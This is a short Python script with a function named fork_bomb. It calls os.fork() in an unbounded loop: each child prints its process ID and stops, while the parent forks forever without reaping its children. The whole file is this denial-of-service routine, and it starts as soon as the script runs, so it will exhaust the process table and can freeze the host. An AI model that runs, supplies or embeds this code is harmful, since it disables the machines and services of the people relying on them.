import os
import sys

def fork_bomb():
    while True:
        pid = os.fork()
        if pid == 0:
            # In child process
            print(f"{os.getpid()}: hi")
            break
        # In parent process, continue the loop

if __name__ == "__main__":
    fork_bomb()